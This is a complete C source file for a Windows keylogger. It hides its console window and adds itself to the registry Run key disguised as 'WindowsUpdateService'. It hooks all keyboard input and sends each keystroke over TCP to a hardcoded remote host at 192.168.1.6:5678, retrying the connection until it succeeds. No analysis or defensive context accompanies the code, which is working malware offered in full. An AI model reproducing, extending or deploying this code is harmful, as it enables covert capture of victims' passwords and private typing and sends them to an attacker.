#define WIN32_LEAN_AND_MEAN

#include <Windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")


#define SERVER_IP "192.168.1.6"
#define SERVER_PORT 5678

#define RETRY_TIME 3000 // 3 seconds
#define MAX_RETRIES 100 // retry 100 times


SOCKET ConnectSocket = INVALID_SOCKET;

int TryConnect(SOCKET sock, struct sockaddr_in* addr) {
    int result = connect(sock, (struct sockaddr*)addr, sizeof(*addr));
    if (result == SOCKET_ERROR) {
        int err = WSAGetLastError();
        if (err == WSAEWOULDBLOCK || err == WSAEINPROGRESS) {
            fd_set writeSet;
            FD_ZERO(&writeSet);
            FD_SET(sock, &writeSet);

            struct timeval timeout;
            timeout.tv_sec = 5;
            timeout.tv_usec = 0;

            result = select(0, NULL, &writeSet, NULL, &timeout);
            if (result > 0 && FD_ISSET(sock, &writeSet)) {
                int sockErr = 0;
                int len = sizeof(sockErr);
                getsockopt(sock, SOL_SOCKET, SO_ERROR, (char*)&sockErr, &len);
                return (sockErr == 0); // 1 = success
            }
        }
        return 0;
    }
    return 1; // Connected immediately
}


SOCKET CreateNonBlockingSocket() {
	SOCKET newSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (newSock == INVALID_SOCKET) {
        return INVALID_SOCKET;
	}
    u_long mode = 1;
    if (ioctlsocket(newSock, FIONBIO, &mode) != NO_ERROR) {
        closesocket(newSock);
        return INVALID_SOCKET;
	}
    return newSock;

}
    


// Map all virtual keys to their string representations
const char* GetKeyString(DWORD vkCode) {
       switch (vkCode) {
            // Mouse buttons
        case 0x01: return "[LCLICK]";
        case 0x02: return "[RCLICK]";
        case 0x04: return "[MBUTTON]";

            // Control keys
        case VK_BACK: return "[BACKSPACE]";
        case VK_TAB: return "[TAB]";
        case VK_RETURN: return "[ENTER]";
        case VK_SHIFT: return "[SHIFT]";
        case VK_CONTROL: return "[CTRL]";
        case VK_MENU: return "[ALT]";
        case VK_CAPITAL: return "[CAPSLOCK]";
        case VK_ESCAPE: return "[ESC]";
        case VK_SPACE: return "[SPACE]";
        case VK_PRIOR: return "[PAGE UP]";
        case VK_NEXT: return "[PAGE DOWN]";
        case VK_END: return "[END]";
        case VK_HOME: return "[HOME]";
        case VK_LEFT: return "[LEFT]";
        case VK_UP: return "[UP]";
        case VK_RIGHT: return "[RIGHT]";
        case VK_DOWN: return "[DOWN]";
        case VK_INSERT: return "[INS]";
        case VK_DELETE: return "[DEL]";

            // Number keys (top row)
        case 0x30: return "0";
        case 0x31: return "1";
        case 0x32: return "2";
        case 0x33: return "3";
        case 0x34: return "4";
        case 0x35: return "5";
        case 0x36: return "6";
        case 0x37: return "7";
        case 0x38: return "8";
        case 0x39: return "9";

            // Alphabet keys
        case 0x41: return "A";
        case 0x42: return "B";
        case 0x43: return "C";
        case 0x44: return "D";
        case 0x45: return "E";
        case 0x46: return "F";
        case 0x47: return "G";
        case 0x48: return "H";
        case 0x49: return "I";
        case 0x4A: return "J";
        case 0x4B: return "K";
        case 0x4C: return "L";
        case 0x4D: return "M";
        case 0x4E: return "N";
        case 0x4F: return "O";
        case 0x50: return "P";
        case 0x51: return "Q";
        case 0x52: return "R";
        case 0x53: return "S";
        case 0x54: return "T";
        case 0x55: return "U";
        case 0x56: return "V";
        case 0x57: return "W";
        case 0x58: return "X";
        case 0x59: return "Y";
        case 0x5A: return "Z";

            // Function keys
        case VK_F1: return "[F1]";
        case VK_F2: return "[F2]";
        case VK_F3: return "[F3]";
        case VK_F4: return "[F4]";
        case VK_F5: return "[F5]";
        case VK_F6: return "[F6]";
        case VK_F7: return "[F7]";
        case VK_F8: return "[F8]";
        case VK_F9: return "[F9]";
        case VK_F10: return "[F10]";
        case VK_F11: return "[F11]";
        case VK_F12: return "[F12]";

            // Numpad keys
        case VK_NUMPAD0: return "NUM0";
        case VK_NUMPAD1: return "NUM1";
        case VK_NUMPAD2: return "NUM2";
        case VK_NUMPAD3: return "NUM3";
        case VK_NUMPAD4: return "NUM4";
        case VK_NUMPAD5: return "NUM5";
        case VK_NUMPAD6: return "NUM6";
        case VK_NUMPAD7: return "NUM7";
        case VK_NUMPAD8: return "NUM8";
        case VK_NUMPAD9: return "NUM9";
        case VK_DECIMAL: return "NUM.";
        case VK_DIVIDE: return "NUM/";
        case VK_MULTIPLY: return "NUM*";
        case VK_SUBTRACT: return "NUM-";
        case VK_ADD: return "NUM+";

            // Toggle keys
        case VK_NUMLOCK: return "[NUMLOCK]";
        case VK_SCROLL: return "[SCROLLLOCK]";

            // OEM keys (common special characters)
        case VK_OEM_1: return ";";
        case VK_OEM_PLUS: return "=";
        case VK_OEM_COMMA: return ",";
        case VK_OEM_MINUS: return "-";
        case VK_OEM_PERIOD: return ".";
        case VK_OEM_2: return "/";
        case VK_OEM_3: return "`";
        case VK_OEM_4: return "[";
        case VK_OEM_5: return "\\";
        case VK_OEM_6: return "]";
        case VK_OEM_7: return "'";

        default:
            return "[UNKNOWN]";
        }
  }


// Hide the console window
void HideConsole() {
	HWND hwnd = GetConsoleWindow();	
	ShowWindow(hwnd, 0);
}

// Add the executable to startup
void AddToStartup(const char* exePath, const char* entryName) {
    HKEY hKey;
    RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
    RegSetValueEx(hKey, entryName, 0, REG_SZ, (const BYTE*)exePath, strlen(exePath) + 1);
    RegCloseKey(hKey);
}

// Send data to remote host
void sendtoremotehost(const char* Data) {
    if (ConnectSocket == INVALID_SOCKET) return;

    int result = send(ConnectSocket, Data, (int)strlen(Data), 0);
    if (result == SOCKET_ERROR) {
        int err = WSAGetLastError();
        if (err != WSAEWOULDBLOCK) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
        }
    }
}

	
	
// Keyboard hook callback function
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
		KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
		DWORD vkCode = kbdStruct->vkCode;
        const char* KeyString = GetKeyString(vkCode);
        if (KeyString) {
            sendtoremotehost(KeyString);
        }

	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Log key presses
void LogKeyPressed() {
		HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
		MSG msg;
		while (GetMessage(&msg, NULL, 0, 0)) {
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
		UnhookWindowsHookEx(keyboardHook);
}


int main() {
    HideConsole();

    // Add to startup
    char path[MAX_PATH];
    GetModuleFileName(NULL, path, MAX_PATH);
    AddToStartup(path, "WindowsUpdateService");

    // Init Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
        return 1;

    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &serverAddr.sin_addr);

    while (1) {
        ConnectSocket = CreateNonBlockingSocket();
        if (ConnectSocket == INVALID_SOCKET) {
            Sleep(RETRY_TIME);
            continue;
        }

        if (TryConnect(ConnectSocket, &serverAddr)) {
            // Connected, launch keylogger
            LogKeyPressed();

            // LogKeyPressed likely blocks; when done, we close
            closesocket(ConnectSocket);
        }
        else {
            // Failed to connect
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            Sleep(RETRY_TIME);
        }
    }

    WSACleanup();
    return 0;
}